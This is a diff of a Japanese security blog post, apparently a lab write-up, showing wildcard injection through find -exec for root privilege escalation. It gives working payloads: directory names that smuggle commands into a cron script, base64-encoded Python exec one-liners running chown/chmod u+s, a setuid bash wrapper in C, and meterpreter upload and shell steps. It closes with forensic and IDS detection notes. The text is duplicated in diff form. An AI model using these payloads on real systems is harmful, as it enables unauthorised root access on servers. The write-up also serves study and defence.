-</span></span><span class="line"><span class="cl">$ ls
-</span></span><span class="line"><span class="cl"><span class="m">201903</span>  <span class="m">201904</span>  <span class="m">201905</span>
-</span></span></code></pre></div><br/>
-find はご存知の通り、ファイルやディレクトリを検索するコマンドです。  
--exec オプションは、検索にマッチしたパスに対して、パスごとにOSコマンドを適用できます。
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ find *
-</span></span><span class="line"><span class="cl"><span class="m">201903</span>
-</span></span><span class="line"><span class="cl"><span class="m">201904</span>
-</span></span><span class="line"><span class="cl"><span class="m">201905</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">shu@kali:/tmp/images$ find * -exec <span class="nb">echo</span> <span class="s2">&#34;Path:{}&#34;</span> <span class="se">\;</span>
-</span></span><span class="line"><span class="cl">Path:201903
-</span></span><span class="line"><span class="cl">Path:201904
-</span></span><span class="line"><span class="cl">Path:201905
-</span></span></code></pre></div><p>※{}はマッチしたものが入る変数です。<br>
+<!-- raw HTML omitted --></p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ mkdir /tmp/images/
+$ <span class="nb">cd</span> /tmp/images
+$ mkdir <span class="m">201903</span> <span class="m">201904</span> 201905
+$ ls
+<span class="m">201903</span>  <span class="m">201904</span>  201905
+
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find *
+201903
+201904
+201905
+
+shu@kali:/tmp/images$ find * -exec <span class="nb">echo</span> <span class="s2">&#34;Path:{}&#34;</span> <span class="se">\;</span>
+Path:201903
+Path:201904
+Path:201905
+</code></pre></div><p>※{}はマッチしたものが入る変数です。<br>
 ※「;」は-execの終了を示す記号です。<br>
 本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。</p>
 <p>上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。<br>
 {}を使う必要もなし。以下みたいに。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ find * -exec uname <span class="se">\;</span>
-</span></span><span class="line"><span class="cl">Linux
-</span></span><span class="line"><span class="cl">Linux
-</span></span><span class="line"><span class="cl">Linux
-</span></span></code></pre></div><p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find * -exec uname <span class="se">\;</span>
+Linux
+Linux
+Linux
+</code></pre></div><p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>
 <p>当然touch コマンドとかもいいです。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ find * -exec touch Test <span class="se">\;</span>
-</span></span><span class="line"><span class="cl">shu@kali:/tmp/images$ ls -l
-</span></span><span class="line"><span class="cl">total <span class="m">12</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 <span class="m">201903</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 <span class="m">201904</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 <span class="m">201905</span>
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> shu shu    <span class="m">0</span> May <span class="m">13</span> 07:25 Test
-</span></span></code></pre></div><p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find * -exec touch Test <span class="se">\;</span>
+shu@kali:/tmp/images$ ls -l
+total 12
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201903
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201904
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201905
+-rw-r--r-- <span class="m">1</span> shu shu    <span class="m">0</span> May <span class="m">13</span> 07:25 Test
+</code></pre></div><p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br>
 (状態をスイッチするコマンドとかは冪等性が保たれないのでここで使うのはよくない🙅)</p>
 <p>なお、findコマンドを実行したユーザの権限でOSコマンドが実行されます。</p>
-<br/>
-## WildCard Injection の原理
+<!-- raw HTML omitted -->
 <p>次はこの-execの仕組みを利用して攻撃を試行します。</p>
 <h3 id="実験環境の作成">実験環境の作成</h3>
 <p>実験用にbakProductImage.shのfind部分を再現したシェルを作成し、vuln.shとして保存します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find /tmp/images -mindepth <span class="m">1</span> -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d<span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
-</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;find </span><span class="nv">$dir</span><span class="s2"> -maxdepth 1 -name &#39;goods_img&#39; -type d &#34;</span>
-</span></span><span class="line"><span class="cl">	     find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d 
-</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;===&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">done</span>
-</span></span></code></pre></div><br/>
-試しに実行してみます。
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ bash vuln.sh
-</span></span><span class="line"><span class="cl">find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span><span class="line"><span class="cl">find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span><span class="line"><span class="cl">find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span></code></pre></div><p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find /tmp/images -mindepth <span class="m">1</span> -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d<span class="sb">`</span>
+
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+	<span class="nb">echo</span> <span class="s2">&#34;find </span><span class="nv">$dir</span><span class="s2"> -maxdepth 1 -name &#39;goods_img&#39; -type d &#34;</span>
+	     find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d 
+	<span class="nb">echo</span> <span class="s2">&#34;===&#34;</span>
+<span class="k">done</span>
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash vuln.sh
+find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+</code></pre></div><p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br>
 echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&quot;goods_img&quot;が存在せず検索にマッチしなかったからです。</p>
 <p>試しに201903のディレクトリにgoods_imgディレクトリを作成します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ mkdir 201903/goods_img
-</span></span></code></pre></div><br/>
-再度実行してみます。
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ bash vuln.sh
-</span></span><span class="line"><span class="cl">find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span><span class="line"><span class="cl">find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span><span class="line"><span class="cl">find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
-</span></span><span class="line"><span class="cl">/tmp/images/201903/goods_img
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span></code></pre></div><p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>
-<br/>
-### ⚠️危険⚠️なディレクトリを作成する
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir 201903/goods_img
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash vuln.sh
+find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
+/tmp/images/201903/goods_img
+<span class="o">===</span>
+</code></pre></div><p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>
+<!-- raw HTML omitted -->
 <p>ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、<br>
 ⚠️危険⚠️な名前のディレクトリを作成すれば任意のコマンドが実行できるということです。</p>
 <p>以下のようにディレクトリ名とは思えないディレクトリを作成します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec touch hack ;&#34;</span>
-</span></span><span class="line"><span class="cl">shu@kali:/tmp/images$ ls -l
-</span></span><span class="line"><span class="cl">total <span class="m">20</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:48  <span class="m">201903</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  <span class="m">201904</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  <span class="m">201905</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 08:04 <span class="s1">&#39;* -exec touch hack ;&#39;</span>
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
-</span></span></code></pre></div><p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec touch hack ;&#34;</span>
+shu@kali:/tmp/images$ ls -l
+total 20
+drwxr-xr-x <span class="m">3</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:48  201903
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  201904
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  201905
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 08:04 <span class="s1">&#39;* -exec touch hack ;&#39;</span>
+-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
+</code></pre></div><p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br>
 先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、<br>
 また -exec の終端を示すため末尾に「;」を付与しています。</p>
 <p>さて、この状態でもう一度vuln.shを実行します。</p>
-<figure><img src="./find_test_injection.png"/>
+<figure>
+    <img src="./find_test_injection.png"/> 
 </figure>
 
 <p>エラーが大量に出ていますね。大量のエラーはインジェクション系攻撃の宿命です。</p>
 <p>危険なディレクトリを使ったfindはどうなっているでしょうか。下に抜粋します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /tmp/images/* -exec touch hack <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
-</span></span></code></pre></div><p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">find /tmp/images/* -exec touch hack <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
+</code></pre></div><p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>
 <p>ディレクトリの状態を見ます。</p>
-<figure><img src="./find_test_injection_ls.png"/>
+<figure>
+    <img src="./find_test_injection_ls.png"/> 
 </figure>
 
 <p>hackファイルが作成されていますね。実験環境でWildcard Injectionが成功しました💪</p>
 <p>これをcronがroot権限でやってくれると権限昇格が捗りますね。　←ここ一番キモ</p>
-<br/>
+<!-- raw HTML omitted -->
 <h3 id="-exec-の使い勝手を良くする">-exec の使い勝手を良くする</h3>
 <p>前項でWildcard Injectionは成功しましたが、これだけでは侵害には使いにくいです。<br>
 これは以下の理由によるものです。</p>
@@ -613,52 +627,54 @@ echoだけがあって2つめのfindの結果が表示されないのは、各�
 これはforとfindの問題だと思いますが・・・。</li>
 </ul>
 <p>ただ、単一コマンドしか使えない場合でも、例えば bashなら bash -c を使ってワンライナーで複数コマンドを書くことができます。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ bash -c <span class="s2">&#34;echo aaa; echo bbb&#34;</span>
-</span></span><span class="line"><span class="cl">aaa
-</span></span><span class="line"><span class="cl">bbb
-</span></span></code></pre></div><p>しかしながら、今回のfor内のfindではスペースが使えません。<br>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash -c <span class="s2">&#34;echo aaa; echo bbb&#34;</span>
+aaa
+bbb
+</code></pre></div><p>しかしながら、今回のfor内のfindではスペースが使えません。<br>
 実際に試してみます。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec bash -c \&#34;touch aaa\&#34; ;&#34;</span>
-</span></span><span class="line"><span class="cl">shu@kali:/tmp/images$ bash vuln.sh
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">===</span>
-</span></span><span class="line"><span class="cl">find /tmp/images/* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span><span class="line"><span class="cl">aaa<span class="s2">&#34;: -c: line 0: unexpected EOF while looking for matching `&#34;</span><span class="s1">&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s1">aaa&#34;: -c: line 1: syntax error: unexpected end of file
-</span></span></span><span class="line"><span class="cl"><span class="s1">(snip)
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">shu@kali:/tmp/images$ ls -l
-</span></span></span><span class="line"><span class="cl"><span class="s1">total 20
-</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
-</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
-</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
-</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 08:34 &#39;</span>* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
-</span></span></code></pre></div><p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec bash -c \&#34;touch aaa\&#34; ;&#34;</span>
+shu@kali:/tmp/images$ bash vuln.sh
+<span class="o">(</span>snip<span class="o">)</span>
+<span class="o">===</span>
+find /tmp/images/* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
+<span class="o">(</span>snip<span class="o">)</span>
+aaa<span class="s2">&#34;: -c: line 0: unexpected EOF while looking for matching `&#34;</span><span class="s1">&#39;
+</span><span class="s1">aaa&#34;: -c: line 1: syntax error: unexpected end of file
+</span><span class="s1">(snip)
+</span><span class="s1">
+</span><span class="s1">shu@kali:/tmp/images$ ls -l
+</span><span class="s1">total 20
+</span><span class="s1">drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 08:34 &#39;</span>* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span><span class="err">&#39;</span>
+-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
+
+</code></pre></div><p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>
 <h3 id="pythonによるワンライナー">Pythonによるワンライナー</h3>
 <p>このままでは単一コマンドしか使えないので、侵害には使いづらいです。<br>
 ただ、今回ECShopが稼働しているサーバにはPythonが入っていました。</p>
 <p>Pythonやperlなど、高機能なコマンドが入っていると侵害に非常に役に立ちます。<br>
 スペースやスラッシュなんてbase64エンコードしてしまえばいいのです。</p>
 <p>ということで、できあがったものがこちらです。</p>
-<pre tabindex="0"><code>mkdir &#34;* -exec python -c exec(&#39;[base64エンコードしたpythonコード]&#39;.decode(&#39;base64&#39;)) ;&#34;
+<pre><code>mkdir &quot;* -exec python -c exec('[base64エンコードしたpythonコード]'.decode('base64')) ;&quot;
 </code></pre><p>スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h4 id="試しにディレクトリ作成">試しにディレクトリ作成</h4>
 <p>1度にtouchコマンドを2回使ってaaa、bbbディレクトリを作成してみます。</p>
 <p>os.systemを使えばOSコマンドが実行できます。</p>
-<pre tabindex="0"><code>&gt;&gt;&gt; &#34;import os;os.system(&#39;touch aaa; touch bbb&#39;)&#34;.encode(&#34;base64&#34;)
-&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n&#39;
+<pre><code>&gt;&gt;&gt; &quot;import os;os.system('touch aaa; touch bbb')&quot;.encode(&quot;base64&quot;)
+'aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n'
 </code></pre><p>⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==&#39;.decode(&#39;base64&#39;)) ;&#34;</span>
-</span></span><span class="line"><span class="cl">shu@kali:/tmp/images$ bash vuln.sh
-</span></span><span class="line"><span class="cl"><span class="o">(</span>snip<span class="o">)</span>
-</span></span></code></pre></div><figure><img src="./find_test_python.png"/>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==&#39;.decode(&#39;base64&#39;)) ;&#34;</span>
+shu@kali:/tmp/images$ bash vuln.sh
+<span class="o">(</span>snip<span class="o">)</span>
+</code></pre></div><figure>
+    <img src="./find_test_python.png"/> 
 </figure>
 
 <p>ディレクトリが作成されていることがわかります。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h1 id="wildcard-injection-を使って権限昇格する">Wildcard Injection を使って権限昇格する</h1>
 <p>おまたせしました。ここでやっとVictim環境で権限昇格です。</p>
 <p>これまでの内容で、findを使って任意のOSコマンドが実行できることがわかりました。<br>
@@ -666,18 +682,18 @@ echoだけがあって2つめのfindの結果が表示されないのは、各�
 今までの材料を使って権限昇格を試みます。</p>
 <h3 id="bashラッパーを作成">bashラッパーを作成</h3>
 <p>以下のコードのファイルを作成します。</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+<pre><code>#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;sys/types.h&gt;
 
 int main()
 {
 	setuid(geteuid());
-	system(&#34;/bin/bash&#34;);
+	system(&quot;/bin/bash&quot;);
 	return 0;
 }
 </code></pre><p>victimに送信し、コンパイルします。</p>
-<pre tabindex="0"><code>meterpreter &gt; upload bash_wrapper.c /tmp/.session
+<pre><code>meterpreter &gt; upload bash_wrapper.c /tmp/.session
 [*] uploading  : bash_wrapper.c -&gt; /tmp/.session
 [*] uploaded   : bash_wrapper.c -&gt; /tmp/.session/bash_wrapper.c
 meterpreter &gt; shell
@@ -694,15 +710,16 @@ ls -l ./w
 作成先は、bakProductImage.sh のfind対象である /var/www/html/images 配下です。</p>
 <p>まずはbase64エンコード。<br>
 「chown root /tmp/.session/w; chmod u+s /tmp/.session/w」というコマンドを実行するPythonコードをbase64エンコードします。</p>
-<pre tabindex="0"><code>&gt;&gt;&gt; &#34;import os;os.system(&#39;chown root /tmp/.session/w; chmod u+s /tmp/.session/w&#39;)&#34;.encode(&#34;base64&#34;)
-&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n&#39;
+<pre><code>&gt;&gt;&gt; &quot;import os;os.system('chown root /tmp/.session/w; chmod u+s /tmp/.session/w')&quot;.encode(&quot;base64&quot;)
+'aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n'
 </code></pre><p>ディレクトリを作成します。</p>
-<pre tabindex="0"><code>meterpreter &gt; shell
+<pre><code>meterpreter &gt; shell
 Process 10076 created.
 Channel 17 created.
 
-mkdir &#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==&#39;.decode(&#39;base64&#39;)) ;&#34;
-</code></pre><figure><img src="./escalation_images_dir.png"/>
+mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ=='.decode('base64')) ;&quot;
+</code></pre><figure>
+    <img src="./escalation_images_dir.png"/> 
 </figure>
 
 <p>作成できました。</p>
@@ -713,19 +730,21 @@ mkdir &#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vd
 <hr>
 <h4 id="翌日1時">～翌日1時～</h4>
 <p>1時になったので、ラッパーファイルの状態を見てみます。</p>
-<figure><img src="./escalation_success_dir.png"/>
+<figure>
+    <img src="./escalation_success_dir.png"/> 
 </figure>
 
 <p>見事ラッパーファイルの所有者がrootになってsuidがついていますね。
 更新日時も1時になっています。</p>
 <p>早速アクセスします。</p>
-<figure><img src="./escalation_success_whoami.png"/>
+<figure>
+    <img src="./escalation_success_whoami.png"/> 
 </figure>
 
 <p>画像の通り root 権限になっています。</p>
 <p><strong>権限昇格成功です💪</strong></p>
 <p>あとはmeterpreterを接続するなりしてなんでも好きなことができます。</p>
-<br/>
+<!-- raw HTML omitted -->
 <hr>
 <h1 id="攻撃の痕跡">攻撃の痕跡</h1>
 <h2 id="ids">IDS</h2>
@@ -733,15 +752,16 @@ mkdir &#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vd
 ただ、meterpreter接続後は全く検知しませんでした。</p>
 <p>入口対策、および初期侵入の検知時にいかに対応できるかが侵害発見のポイントになりそうです。</p>
 <p>検知シグネチャは以下のとおり。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h4 id="et-attack_response-wso---webshell-activity---wso-title">ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title</h4>
 <p>WSOの各操作のレスポンスで検知しました。</p>
 <h4 id="et-policy-executable-and-linking-format-elf-file-download">ET POLICY Executable and linking format (ELF) file download</h4>
 <p>meterpreter にスイッチするためにmeterpreter stageをダウンロードするので、その時のバイナリを検知しました。</p>
-<figure><img src="./ids_meterpreter_stager.png"/>
+<figure>
+    <img src="./ids_meterpreter_stager.png"/> 
 </figure>
 
-<br/>
+<!-- raw HTML omitted -->
 <h3 id="ファイルシステム">ファイルシステム</h3>
 <p>攻撃者は、全てのアクションは最初に侵入したユーザの権限の範囲内でのみ行なえます。</p>
 <p>今回はwww-dataユーザだったので、以下のディレクトリに書き込みが可能でした。</p>
@@ -755,35 +775,34 @@ mkdir &#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vd
 <p>侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。<br>
 なので /var/www/html など、tmpの他に侵害ユーザが書き込み可能なディレクトリも全て洗い出すべきですね。</p>
 <p>下記findコマンドでwww-dataが書き込み可能なディレクトリを調べられます。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / <span class="se">\(</span> -perm -002 -o -user www-data -o -group www-data <span class="se">\)</span> -type d
-</span></span></code></pre></div><br/>
-また、攻撃者は今回/tmp/.sessionを作業ディレクトリにしました。  
-ドットファイル/ドットディレクトリはlsコマンド単体では出てこないので注意。  
-(ls -aやfindなら出てくる）
-<br/>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">find / <span class="se">\(</span> -perm -002 -o -user www-data -o -group www-data <span class="se">\)</span> -type d
+</code></pre></div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h4 id="tmpbc">/tmp/bc</h4>
 <p>WSO のリバースコネクト用バイナリ。<br>
 WSOのリバースコネクトは、作成するファイル形式をCバイナリかperlスクリプトか選べます。<br>
 Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作成します。</p>
-<br/>
+<!-- raw HTML omitted -->
 <h4 id="tmpsessionw">/tmp/.session/w</h4>
 <p>権限昇格用バイナリ。suidがついているので大変わかりやすいです。</p>
 <p>find で suid が付与されているファイルを洗い出せば出てきます。</p>
-<figure><img src="./forensics_find_suid.png"/>
+<figure>
+    <img src="./forensics_find_suid.png"/> 
 </figure>
 
 <p>一つだけ/tmpに存在するのでバレバレですね。<br>
 攻撃者は/usr/bin/ や /bin/ にファイルを作成できないのでこんなことになるのです。</p>
